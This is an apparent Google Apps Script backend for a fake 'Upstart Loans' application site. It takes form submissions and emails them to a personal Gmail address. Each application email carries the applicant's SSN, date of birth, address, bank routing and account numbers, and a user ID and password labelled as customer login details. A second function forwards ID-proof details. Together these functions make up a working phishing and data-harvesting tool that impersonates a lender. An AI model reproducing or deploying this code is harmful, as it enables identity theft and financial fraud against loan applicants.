// BACKUP: Exact Email Format Script for Upstart Loans
// Step 1: Application form details (exact format)
// Step 2: Agreement with ID proof
// SAVED BEFORE GOOGLE SHEETS INTEGRATION - DO NOT MODIFY

// Configuration
const PRIMARY_EMAIL = "finnfoxpersonalloan@gmail.com";

function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <h1>Upstart Loans Email Service</h1>
    <p>Two-step email system ready.</p>
    <p><strong>Current emails:</strong></p>
    <ul>
      <li>Primary: ${PRIMARY_EMAIL}</li>
    </ul>
  `);
}

function doPost(e) {
  try {
    const data = e.parameter;
    const formType = data.formType || 'loanApplication';
    
    if (formType === 'loanApplication') {
      // STEP 1: Send application form details only
      sendApplicationEmail(data);
    } else if (formType === 'loanAgreement') {
      // STEP 2: Send agreement with ID proof
      sendAgreementEmail(data);
    } else {
      sendErrorEmail('Unknown form type: ' + formType, data);
    }
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'success',
      message: 'Form processed successfully'
    }));
    
  } catch (error) {
    Logger.log('Error in doPost: ' + error.toString());
    sendErrorEmail(error.toString(), e.parameter);
    
    return ContentService.createTextOutput(JSON.stringify({
      result: 'error',
      error: error.toString()
    }));
  }
}

function sendApplicationEmail(data) {
  const subject = `NEW LOAN APPLICATION - ${data.firstName} ${data.lastName} - ${data.loanAmount}`;
  
  const htmlBody = `
    <h2>🏦 Upstart Loans - NEW LOAN APPLICATION</h2>
    
    <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>📋 Application Details</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Application ID:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">LS-${Date.now()}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Full Name:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.firstName} ${data.lastName}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Email:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.email}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Phone:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.phoneNumber}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Address:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.homeAddress}, ${data.city}, ${data.state} ${data.zipCode}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Date of Birth:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.dateOfBirth}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>SSN:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.ssnNumber}</td></tr>
      </table>
    </div>
    
    <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>💰 Loan Information</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Loan Amount:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">$${data.loanAmount}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Loan Purpose:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.loanPurpose}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Loan Term:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.loanTerm} months</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Monthly Payment:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">$${data.monthlyPayment}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Loan Agent:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.loanAgent}</td></tr>
      </table>
    </div>
    
    <div style="background: #fff3e0; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>🏦 Bank Information</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Bank Name:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.bankName}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Routing Number:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.routingNumber}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Account Number:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.accountNumber}</td></tr>
      </table>
    </div>
    
    <div style="background: #f3e5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>👤 Customer Login Details</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>User ID:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.userId}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Password:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.password}</td></tr>
      </table>
    </div>
    
    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #4caf50; color: white; border-radius: 8px;">
      <h3>✅ NEXT STEPS</h3>
      <p>Customer will receive login credentials and can access their dashboard.</p>
      <p>Admin can review this application in the admin portal.</p>
    </div>
    
    <div style="text-align: center; margin-top: 30px; padding: 15px; background: #f5f5f5; border-radius: 8px;">
      <p><strong>📅 Submitted:</strong> ${new Date().toLocaleString()}</p>
      <p><strong>🏢 Upstart Loans</strong></p>
    </div>
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, '', {
    htmlBody: htmlBody,
    name: 'Upstart Loans System'
  });
}

function sendAgreementEmail(data) {
  const subject = `LOAN AGREEMENT SIGNED - ${data.firstName} ${data.lastName} - ${data.applicationId}`;
  
  const htmlBody = `
    <h2>📝 Upstart Loans - LOAN AGREEMENT SIGNED</h2>
    
    <div style="background: #e8f5e8; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>✅ Agreement Details</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Application ID:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.applicationId}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Customer Name:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.firstName} ${data.lastName}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Email:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.email}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Loan Amount:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">$${data.loanAmount}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>Status:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.status}</td></tr>
      </table>
    </div>
    
    <div style="background: #fff3e0; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3>🆔 ID Proof Information</h3>
      <table style="width: 100%; border-collapse: collapse;">
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>ID Proof Name:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.idProofName || 'Not uploaded'}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>ID Proof Size:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.idProofSize || '0 MB'}</td></tr>
        <tr><td style="padding: 8px; border-bottom: 1px solid #ddd;"><strong>ID Proof Type:</strong></td><td style="padding: 8px; border-bottom: 1px solid #ddd;">${data.idProofType || 'None'}</td></tr>
      </table>
    </div>
    
    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #2196f3; color: white; border-radius: 8px;">
      <h3>🎉 AGREEMENT COMPLETED</h3>
      <p>Customer has successfully signed the loan agreement.</p>
      <p>Loan processing can now proceed.</p>
    </div>
    
    <div style="text-align: center; margin-top: 30px; padding: 15px; background: #f5f5f5; border-radius: 8px;">
      <p><strong>📅 Signed:</strong> ${new Date().toLocaleString()}</p>
      <p><strong>🏢 Upstart Loans</strong></p>
    </div>
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, '', {
    htmlBody: htmlBody,
    name: 'Upstart Loans System'
  });
}

function sendErrorEmail(error, data) {
  const subject = '❌ ERROR - Upstart Loans APPLICATION';
  const body = `
    Error occurred: ${error}
    
    Data received: ${JSON.stringify(data, null, 2)}
    
    Time: ${new Date().toLocaleString()}
  `;
  
  GmailApp.sendEmail(PRIMARY_EMAIL, subject, body);
}

function saveIdProofToCustomerDashboard(data) {
  try {
    const spreadsheetId = "YOUR_SPREADSHEET_ID"; // Replace with actual spreadsheet ID
    const sheetName = "CustomerData";
    
    const spreadsheet = SpreadsheetApp.openById(spreadsheetId);
    const sheet = spreadsheet.getSheetByName(sheetName);
    
    if (!sheet) {
      Logger.log('Sheet not found: ' + sheetName);
      return;
    }
    
    // Find the customer row by email
    const dataRange = sheet.getDataRange();
    const values = dataRange.getValues();
    const headers = values[0];
    
    let customerRow = -1;
    for (let i = 1; i < values.length; i++) {
      if (values[i][headers.indexOf('Email')] === data.email) {
        customerRow = i + 1; // +1 because sheets are 1-indexed
        break;
      }
    }
    
    if (customerRow > 0) {
      // Update existing customer
      const idProofColumn = headers.indexOf('ID Proof Name');
      const idProofSizeColumn = headers.indexOf('ID Proof Size');
      const idProofTypeColumn = headers.indexOf('ID Proof Type');
      
      sheet.getRange(customerRow, idProofColumn + 1).setValue(data.idProofName || 'Not uploaded');
      sheet.getRange(customerRow, idProofSizeColumn + 1).setValue(data.idProofSize || '0 MB');
      sheet.getRange(customerRow, idProofTypeColumn + 1).setValue(data.idProofType || 'None');
      
      Logger.log('ID proof saved for customer: ' + data.email);
    } else {
      Logger.log('Customer not found: ' + data.email);
    }
    
  } catch (error) {
    Logger.log('Error saving ID proof: ' + error.toString());
  }
}
